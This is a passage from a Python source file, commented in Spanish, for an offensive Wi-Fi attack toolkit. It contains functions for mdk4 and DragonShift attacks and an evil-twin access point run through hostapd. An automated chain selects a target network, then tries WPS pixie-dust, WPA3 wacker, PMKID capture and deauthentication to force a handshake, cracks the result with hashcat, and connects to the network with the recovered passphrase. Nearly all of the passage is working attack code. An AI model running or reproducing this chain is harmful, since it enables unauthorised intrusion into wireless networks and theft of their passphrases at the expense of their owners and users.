        proc.wait(timeout=6)
    except Exception:
        proc.kill()
    return f"mdk4 {modo} finalizado"


def dragonshift(ruta=None, log=None, timeout=1800):
    script = ruta or _buscar_script("DragonShift") or _existe_bin("DragonShift") or ""
    if not script:
        return "", ("DragonShift no encontrado. git clone "
                    "https://github.com/jabbaw0nky/DragonShift")
    proc = _pop_stream(["python3", script], sudo=False)
    if not proc:
        return "", "no pude lanzar DragonShift"
    t0 = time.time()
    for ln in proc.stdout:
        if log:
            log(ln.rstrip())
        if time.time() - t0 > timeout:
            proc.terminate()
            break
    try:
        proc.wait(timeout=6)
    except Exception:
        proc.kill()
    return "ejecutado", "dragonshift"


# ===========================================================================
#  Evil twin mínimo
# ===========================================================================
def evil_twin(iface, ssid, canal, salida="", segundos=120, log=None):
    if not _existe_bin("hostapd"):
        return "hostapd no instalado"
    conf = os.path.join(_TMP, "hostapd_jaguar.conf")
    with open(conf, "w", encoding="utf-8") as f:
        f.write("interface=" + iface + "\ndriver=nl80211\nssid=" + ssid +
                "\nhw_mode=g\nchannel=" + str(canal or 6) +
                "\nignore_broadcast_ssid=0\n")
    proc = _pop(["hostapd", conf])
    if log:
        log(f"[evil twin] hostapd con SSID '{ssid}' en {iface}")
    time.sleep(segundos)
    _terminar(proc)
    return "evil twin finalizado (" + salida + ")"


# ===========================================================================
#  Conectar la interfaz a la red obtenida
# ===========================================================================
def conectar(iface, ssid, psk):
    if not ssid:
        return "falta el SSID"
    if not ES_WIN and _existe_bin("nmcli"):
        rc, out = _run(["nmcli", "dev", "wifi", "connect", ssid,
                        "password", psk, "ifname", iface], timeout=120)
        if rc == 0:
            return "conectado por nmcli\n" + ip_de(iface) + "\n" + out.strip()[-300:]
    conf = os.path.join(_TMP, "wpa_jaguar.conf")
    with open(conf, "w", encoding="utf-8") as f:
        f.write("ctrl_interface=/var/run/wpa_supplicant\nupdate_config=1\n"
                "network={\n"
                f'    ssid="{ssid}"\n'
                f'    psk="{psk}"\n'
                "    key_mgmt=WPA-PSK SAE\n"
                "    ieee80211w=1\n}\n")
    _run(["pkill", "-f", "wpa_supplicant"])
    _run(["ip", "link", "set", iface, "down"])
    _run(["iw", iface, "set", "type", "managed"])
    _run(["ip", "link", "set", iface, "up"])
    time.sleep(1)
    rc, out = _run(["wpa_supplicant", "-B", "-i", iface, "-c", conf], timeout=45)
    time.sleep(6)
    for dhcp in (["dhclient", "-1", iface], ["dhcpcd", iface], ["udhcpc", "-i", iface]):
        if _existe_bin(dhcp[0]):
            _run(dhcp, timeout=45)
            break
    return f"wpa_supplicant rc={rc}\n{ip_de(iface)}\n{out.strip()[-400:]}"


# ===========================================================================
#  Cadena automática
# ===========================================================================
def auto_atacar(mon, iface, ap, wordlist, log=None, segundos_pmkid=25):
    informe = []

    def _l(t):
        informe.append(t)
        if log:
            log(t)

    _l("[*] objetivo: %s (%s) | %s | canal %s | %s dBm"
       % (ap.get("essid"), ap.get("bssid"), ap.get("seguridad"),
          ap.get("canal"), ap.get("senal")))
    _l("[*] ataque recomendado: " + str(ap.get("recomendado")))
    psk = ""

    if ap.get("abierta"):
        _l("[+] red abierta: no hay PSK")
        return "", "\n".join(informe)
    if ap.get("wep"):
        _l("[*] WEP: usa aircrack-ng con los IVs (aireplay-ng -3)")
        return "", "\n".join(informe)

    if ap.get("wps"):
        _l("[*] WPS activo -> pixie-dust primero (rápido y offline)")
        cmd, err = wps_comando("pixie", mon, ap["bssid"], ap.get("canal") or "1")
        if cmd:
            psk = correr_wps(cmd, log=log, timeout=420)
            if psk:
                _l("[+] PSK por WPS pixie-dust: " + psk)
                return psk, "\n".join(informe)
            _l("[!] pixie-dust sin resultado; sigo con PMKID/handshake")
        elif err:
            _l("[!] " + err)

    if ap.get("wpa3") and not ap.get("transicion"):
        _l("[*] WPA3 puro: SAE no se descifra offline -> wacker")
        psk, _ = wpa3_wacker(iface, ap["essid"], ap["bssid"], wordlist, log=log)
        if psk:
            _l("[+] PSK por wacker: " + psk)
            return psk, "\n".join(informe)
        _l("[!] wacker sin resultado; pruebo PMKID igualmente")

    captura = capturar_pmkid(mon, ap["bssid"], ap.get("canal"), segundos_pmkid)
    _l("[*] captura: " + captura)
    hash22000, resumen = convertir(captura)
    if not hash22000:
        _l("[!] sin PMKID; forzando handshake con deauth")
        deauth(mon, ap["bssid"], 8)
        time.sleep(6)
        hash22000, resumen = convertir(captura)
    if not hash22000:
        _l("[!] no se pudo extraer hash: " + str(resumen)[-400:])
        return "", "\n".join(informe)

    _l("[*] hash 22000 generado -> hashcat")
    psk, metodo = crackear(hash22000, wordlist, log=log)
    if psk:
        _l("[+] PSK encontrada (%s): %s" % (metodo, psk))
    else:
        _l("[!] sin resultado: " + str(metodo))
    return psk, "\n".join(informe)